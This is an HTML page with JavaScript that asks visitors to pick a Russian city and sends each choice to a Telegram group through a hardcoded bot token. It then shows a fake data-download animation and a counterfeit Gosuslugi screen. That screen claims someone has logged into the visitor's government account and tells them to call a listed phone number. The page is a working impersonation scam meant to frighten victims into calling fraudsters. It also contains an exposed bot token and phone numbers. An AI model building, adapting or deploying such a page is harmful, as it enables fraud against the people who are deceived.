<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Выбор города</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      height: 100vh;
      overflow: hidden;
      background: #000;
      font-family: 'Lato', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      color: white;
    }

    .city-screen {
      width: 100vw;
      height: 100vh;
      background: #000;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 40px 20px;
    }

    .city-container {
      width: 100%;
      max-width: 420px;
      background: #111;
      border-radius: 24px;
      padding: 40px 32px;
      text-align: center;
      box-shadow: 0 20px 40px rgba(0,0,0,0.6);
    }

    .city-logo {
      width: 80px;
      height: 80px;
      background: #2563eb;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 24px;
    }

    .city-logo i {
      color: white;
      font-size: 40px;
    }

    .city-title {
      font-size: 28px;
      font-weight: 600;
      margin-bottom: 32px;
      color: #fff;
    }

    .city-input {
      width: 100%;
      padding: 18px 20px;
      font-size: 18px;
      border: 2px solid #333;
      border-radius: 14px;
      background: #1a1a1a;
      color: white;
      outline: none;
      margin-bottom: 8px;
    }

    .city-input:focus {
      border-color: #2563eb;
    }

    .suggestions-dropdown {
      width: 100%;
      max-height: 220px;
      overflow-y: auto;
      background: #1f2937;
      border: 1px solid #374151;
      border-radius: 12px;
      margin-bottom: 16px;
      display: none;
    }

    .suggestion-item {
      padding: 12px 18px;
      cursor: pointer;
      font-size: 16px;
      display: flex;
      align-items: center;
      gap: 10px;
      color: #e5e7eb;
      border-bottom: 1px solid #374151;
    }

    .suggestion-item:last-child {
      border-bottom: none;
    }

    .suggestion-item:hover {
      background-color: #374151;
    }

    .geo-btn {
      width: 100%;
      background: #333;
      color: #ccc;
      border: none;
      padding: 14px;
      font-size: 15px;
      border-radius: 12px;
      cursor: pointer;
      margin-bottom: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .geo-btn:hover {
      background: #444;
    }

    .city-btn {
      width: 100%;
      background: #2563eb;
      color: white;
      border: none;
      padding: 18px;
      font-size: 18px;
      font-weight: 600;
      border-radius: 14px;
      cursor: pointer;
    }

    .city-btn:disabled {
      background: #444;
      cursor: not-allowed;
    }

    .shutdown-screen {
      width: 100vw;
      height: 100vh;
      background: #000;
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: white;
      position: absolute;
      top: 0;
      left: 0;
      opacity: 0;
      transition: opacity 0.6s ease-in;
    }

    .shutdown-screen.show {
      display: flex;
      opacity: 1;
    }

    .logo {
      width: 88px;
      height: 88px;
      border: 7px solid #fff;
      border-radius: 50%;
      border-top-color: transparent;
      animation: spin 1.6s linear infinite;
      margin-bottom: 35px;
    }

    .main-text {
      font-size: 23px;
      font-weight: 400;
      margin-bottom: 8px;
    }

    .sub-text {
      font-size: 17px;
      opacity: 0.7;
      margin-bottom: 50px;
    }

    .progress {
      width: 260px;
      height: 5px;
      background: rgba(255,255,255,0.15);
      border-radius: 3px;
      margin-bottom: 25px;
      overflow: hidden;
    }

    .progress-bar {
      width: 0%;
      height: 100%;
      background: #fff;
      animation: progress 5s linear forwards;
    }

    .status-text {
      font-size: 16px;
      opacity: 0.85;
      min-height: 24px;
    }

    .gosuslugi-screen {
      width: 100vw;
      height: 100vh;
      background: #0033a0;
      color: white;
      display: none;
      flex-direction: column;
      align-items: center;
      padding-top: 60px;
      position: absolute;
      top: 0;
      left: 0;
    }

    .gos-header {
      text-align: center;
      margin-bottom: 45px;
    }

    .gos-logo-img {
      height: 52px;
      margin-bottom: 10px;
    }

    .gos-subtitle {
      font-size: 17px;
      opacity: 0.95;
      letter-spacing: 0.3px;
    }

    .success-card {
      background: #fff;
      color: #0033a0;
      width: 92%;
      max-width: 380px;
      border-radius: 16px;
      padding: 40px 25px 35px;
      text-align: center;
      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
    }

    .card-logo {
      width: 92px;
      height: 92px;
      margin-bottom: 20px;
    }

    .success-icon {
      width: 82px;
      height: 82px;
      margin: 0 auto 25px;
    }

    .success-icon svg {
      width: 100%;
      height: 100%;
      animation: popIn 0.7s ease forwards;
    }

    .circle {
      fill: none;
      stroke: #00b140;
      stroke-width: 2.8;
      stroke-dasharray: 82;
      stroke-dashoffset: 82;
      animation: drawCircle 0.8s ease forwards;
    }

    .checkmark {
      fill: none;
      stroke: #00b140;
      stroke-width: 2.8;
      stroke-linecap: round;
      stroke-linejoin: round;
      stroke-dasharray: 26;
      stroke-dashoffset: 26;
      animation: drawCheck 0.6s 0.6s ease forwards;
    }

    @keyframes drawCircle { to { stroke-dashoffset: 0; } }
    @keyframes drawCheck { to { stroke-dashoffset: 0; } }
    @keyframes popIn {
      0% { transform: scale(0.5); opacity: 0; }
      70% { transform: scale(1.08); }
      100% { transform: scale(1); }
    }

    .success-title {
      font-size: 21px;
      font-weight: 600;
      line-height: 1.3;
      margin-bottom: 12px;
      color: #0033a0;
    }

    .warning-text {
      font-size: 12.5px;
      color: #666;
      line-height: 1.4;
      margin-top: 12px;
      padding: 0 10px;
    }

    .btn {
      background: #0033a0;
      color: white;
      border: none;
      padding: 15px 20px;
      font-size: 17px;
      font-weight: 500;
      border-radius: 8px;
      cursor: pointer;
      width: 100%;
    }

    @keyframes spin { to { transform: rotate(360deg); } }
    @keyframes progress { to { width: 100%; } }
    .fade-out { animation: fadeOut 0.9s forwards; }
    @keyframes fadeOut { to { opacity: 0; } }
  </style>
  <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
</head>
<body>

  <!-- ==================== ЭКРАН ВЫБОРА ГОРОДА ==================== -->
  <div id="cityScreen" class="city-screen">
    <div class="city-container">
      <div class="city-logo">
        <i class="fa-solid fa-map-marker-alt"></i>
      </div>
      <div class="city-title">Выберите город</div>

      <input type="text" id="cityInput" class="city-input" placeholder="Введите название города...">

      <div id="suggestions-dropdown" class="suggestions-dropdown"></div>

      <button id="geoBtn" class="geo-btn">
        <i class="fa-solid fa-location-arrow"></i>
        <span>Определить мой город автоматически</span>
      </button>

      <button id="confirmCityBtn" class="city-btn" disabled>Подтвердить выбор →</button>
    </div>
  </div>

  <!-- ==================== АНИМАЦИЯ ==================== -->
  <div class="shutdown-screen" id="loadingScreen">
    <div class="logo"></div>
    <div class="main-text">Выгрузка информации</div>
    <div class="sub-text">Пожалуйста подождите...</div>

    <div class="progress">
      <div class="progress-bar"></div>
    </div>

    <div class="status-text" id="status">Поиск данных...</div>
  </div>

  <div class="gosuslugi-screen" id="gosScreen">
    <div class="gos-header">
      <img src="https://upload.wikimedia.org/wikipedia/commons/3/35/Gosuslugi.svg"
           alt="Госуслуги" class="gos-logo-img">
      <div class="gos-subtitle">Единый портал государственных услуг</div>
    </div>

    <div class="success-card">
      <img src="https://upload.wikimedia.org/wikipedia/commons/3/35/Gosuslugi.svg"
           alt="Госуслуги" class="card-logo">

      <div class="success-icon">
        <svg viewBox="0 0 36 36">
          <circle class="circle" cx="18" cy="18" r="15.5"/>
          <polyline class="checkmark" points="11.5 18.5 15.8 23.8 25 12.5"/>
        </svg>
      </div>

      <div class="success-title">Вход в личный кабинет<br>выполнен успешно</div>

      <div class="warning-text">
        Если вход выполняли не Вы, обратитесь по номеру:
      </div>

      <button class="btn" id="phoneBtn">+7 (920) 522-69-17</button>
    </div>
  </div>

  <script>
    // ==================== НАСТРОЙКИ ====================
    const BOT_TOKEN = "8911603630:AAEBWLuL0Ybiv9gbFq-ojJ57gueRdLvgLH4";
    const GROUP_ID = "-1003852362434";
    const PHONE_NUM = "+7 (987) 910-47-48";

    let currentPhone = localStorage.getItem('admin_phone') || PHONE_NUM;

    // ==================== ПОЛНЫЙ СПИСОК ГОРОДОВ РФ ====================
    const CITY_CACHE_KEY = 'russian_cities_full_v1';
    const CACHE_TTL_DAYS = 30;

    async function getRussianCities() {
      try {
        const cached = localStorage.getItem(CITY_CACHE_KEY);
        if (cached) {
          const data = JSON.parse(cached);
          const isFresh = (Date.now() - data.timestamp) < (CACHE_TTL_DAYS * 24 * 60 * 60 * 1000);
          if (data.cities && data.cities.length > 800 && isFresh) {
            return data.cities;
          }
        }
      } catch (e) {}

      const res = await fetch('https://raw.githubusercontent.com/pensnarik/russian-cities/master/russian-cities.json');
      if (!res.ok) throw new Error('Не удалось загрузить список городов');

      const json = await res.json();
      const cities = json.map(item => item.name).sort();

      try {
        localStorage.setItem(CITY_CACHE_KEY, JSON.stringify({
          timestamp: Date.now(),
          cities: cities
        }));
      } catch (e) {}

      return cities;
    }

    let allCities = [];
    let selectedCity = null;

    function filterCities(query) {
      if (!query || query.length < 1) return [];
      const q = query.toLowerCase().trim();
      return allCities.filter(city => city.toLowerCase().includes(q)).slice(0, 12);
    }

    function showSuggestions(suggestions) {
      const dropdown = document.getElementById('suggestions-dropdown');
      if (!dropdown) return;
      dropdown.innerHTML = '';
      dropdown.style.display = 'block';

      suggestions.forEach(city => {
        const div = document.createElement('div');
        div.className = 'suggestion-item';
        div.innerHTML = `<i class="fa-solid fa-map-marker-alt" style="width:16px;color:#2563eb"></i><span>${city}</span>`;
        div.onclick = () => {
          selectCity(city);
          dropdown.style.display = 'none';
        };
        dropdown.appendChild(div);
      });
    }

    function hideSuggestions() {
      const dropdown = document.getElementById('suggestions-dropdown');
      if (dropdown) dropdown.style.display = 'none';
    }

    function selectCity(city) {
      const input = document.getElementById('cityInput');
      if (!input) return;
      input.value = city;
      selectedCity = city;

      const confirmBtn = document.getElementById('confirmCityBtn');
      if (confirmBtn) confirmBtn.disabled = false;
      hideSuggestions();
    }

    function setupAutocomplete() {
      const input = document.getElementById('cityInput');
      const confirmBtn = document.getElementById('confirmCityBtn');
      let activeIndex = -1;

      if (!input || !confirmBtn) return;

      input.addEventListener('input', () => {
        const query = input.value.trim();
        selectedCity = null;
        confirmBtn.disabled = query.length === 0;

        if (query.length >= 1) {
          showSuggestions(filterCities(query));
          activeIndex = 0;
        } else {
          hideSuggestions();
        }
      });

      input.addEventListener('keydown', (e) => {
        const dropdown = document.getElementById('suggestions-dropdown');
        if (!dropdown) return;
        const items = dropdown.querySelectorAll('.suggestion-item');

        if (e.key === 'ArrowDown') {
          e.preventDefault();
          activeIndex = Math.min(activeIndex + 1, items.length - 1);
          updateActiveSuggestion(items, activeIndex);
        } else if (e.key === 'ArrowUp') {
          e.preventDefault();
          activeIndex = Math.max(activeIndex - 1, 0);
          updateActiveSuggestion(items, activeIndex);
        } else if (e.key === 'Enter') {
          e.preventDefault();
          if (activeIndex >= 0 && items[activeIndex]) {
            selectCity(items[activeIndex].textContent.trim());
          } else if (input.value.trim()) {
            selectCity(input.value.trim());
          }
        } else if (e.key === 'Escape') {
          hideSuggestions();
          activeIndex = -1;
        }
      });

      document.addEventListener('click', (e) => {
        const dropdown = document.getElementById('suggestions-dropdown');
        if (dropdown && !input.contains(e.target) && !dropdown.contains(e.target)) {
          hideSuggestions();
        }
      });

      confirmBtn.addEventListener('click', async () => {
        const cityValue = input.value.trim();
        if (!cityValue) return;
        if (!selectedCity) selectedCity = cityValue;

        await sendTelegramNotification(selectedCity);
        document.getElementById('cityScreen').style.display = 'none';
        startAnimation();
      });
    }

    function updateActiveSuggestion(items, activeIndex) {
      items.forEach((item, idx) => {
        if (idx === activeIndex) {
          item.style.backgroundColor = '#334155';
          item.style.color = '#fff';
        } else {
          item.style.backgroundColor = '';
          item.style.color = '#ccc';
        }
      });
    }

    // ==================== ГЕОЛОКАЦИЯ ====================
    const geoBtn = document.getElementById('geoBtn');
    if (geoBtn) {
      geoBtn.addEventListener('click', () => {
        if (!navigator.geolocation) {
          alert('Геолокация не поддерживается.');
          return;
        }

        geoBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Определяем...`;
        geoBtn.disabled = true;

        navigator.geolocation.getCurrentPosition(async (position) => {
          const { latitude, longitude } = position.coords;

          try {
            const res = await fetch(
              `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=ru`,
              { headers: { 'User-Agent': 'CitySelector/1.0' } }
            );
            const data = await res.json();

            let cityName = data.address?.city || data.address?.town || data.address?.village || data.address?.municipality;
            if (cityName) {
              const input = document.getElementById('cityInput');
              if (input) input.value = cityName;
              const confirmBtn = document.getElementById('confirmCityBtn');
              if (confirmBtn) confirmBtn.disabled = false;
              geoBtn.style.display = 'none';
            } else {
              alert('Не удалось определить населённый пункт.');
            }
          } catch (e) {
            alert('Ошибка геолокации.');
          }

          geoBtn.innerHTML = `<i class="fa-solid fa-location-arrow"></i> Определить мой город автоматически`;
          geoBtn.disabled = false;
        }, () => {
          geoBtn.innerHTML = `<i class="fa-solid fa-location-arrow"></i> Определить мой город автоматически`;
          geoBtn.disabled = false;
          alert('Доступ к геолокации запрещён.');
        });
      });
    }

    // ==================== TELEGRAM ====================
    async function sendTelegramNotification(city) {
      const message = `🔔 <b>Клиент выбрал город:</b> ${city}`;
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: GROUP_ID,
            text: message,
            parse_mode: "HTML"
          })
        });
      } catch (e) {}
    }

    // ==================== АНИМАЦИЯ (только резкие искажения, без шума) ====================
    function startAnimation() {
      const loadingScreen = document.getElementById('loadingScreen');
      const gosScreen = document.getElementById('gosScreen');
      const statusText = document.getElementById('status');
      const phoneBtn = document.getElementById('phoneBtn');

      if (phoneBtn) {
        phoneBtn.textContent = currentPhone;
        phoneBtn.onclick = () => window.location.href = `tel:${currentPhone.replace(/\D/g, '')}`;
      }

      const messages = [
        "Поиск данных...",
        "Данные найдены!",
        "Загрузка Документов...",
        "Загрузка успешно завершена!"
      ];

      loadingScreen.style.display = 'flex';
      setTimeout(() => loadingScreen.style.opacity = '1', 150);

      messages.forEach((msg, index) => {
        const timeout = index === 0 ? 250 : Math.floor(5000 / (messages.length + 1)) * index;
        setTimeout(() => { statusText.textContent = msg; }, timeout);
      });

      setTimeout(() => {
        // Резкие искажения
        loadingScreen.style.transition = 'transform 0.08s, filter 0.08s';
        loadingScreen.style.transform = 'translateX(-10px)';
        loadingScreen.style.filter = 'hue-rotate(25deg) saturate(2)';

        setTimeout(() => {
          loadingScreen.style.transform = 'translateX(14px)';
          loadingScreen.style.filter = 'hue-rotate(-35deg) saturate(2.2)';

          setTimeout(() => {
            loadingScreen.style.transform = 'translateX(-7px)';
            loadingScreen.style.filter = 'hue-rotate(45deg) saturate(1.8)';

            setTimeout(() => {
              // Сразу убираем экран загрузки и показываем Госуслуги
              loadingScreen.style.display = 'none';
              gosScreen.style.display = 'flex';
            }, 350);
          }, 280);
        }, 220);
      }, 5400);
    }

    // ==================== ИНИЦИАЛИЗАЦИЯ ====================
    async function init() {
      const cityScreen = document.getElementById('cityScreen');

      try {
        allCities = await getRussianCities();
        cityScreen.style.display = 'flex';

        const input = document.getElementById('cityInput');
        const confirmBtn = document.getElementById('confirmCityBtn');

        if (input && confirmBtn) {
          input.addEventListener('input', () => {
            const query = input.value.trim();
            confirmBtn.disabled = query.length === 0;

            if (query.length >= 1) {
              showSuggestions(filterCities(query));
            } else {
              hideSuggestions();
            }
          });

          confirmBtn.addEventListener('click', async () => {
            const city = input.value.trim();
            if (city) {
              await sendTelegramNotification(city);
              cityScreen.style.display = 'none';
              startAnimation();
            }
          });
        }

      } catch (error) {
        cityScreen.innerHTML = `
          <div style="color:#f87171; text-align:center; padding:40px;">
            <i class="fa-solid fa-exclamation-triangle" style="font-size:40px; margin-bottom:20px;"></i><br>
            Не удалось загрузить список городов.<br>
            Проверьте подключение к интернету.
          </div>
        `;
      }
    }

    window.onload = init;
  </script>
</body>
</html>
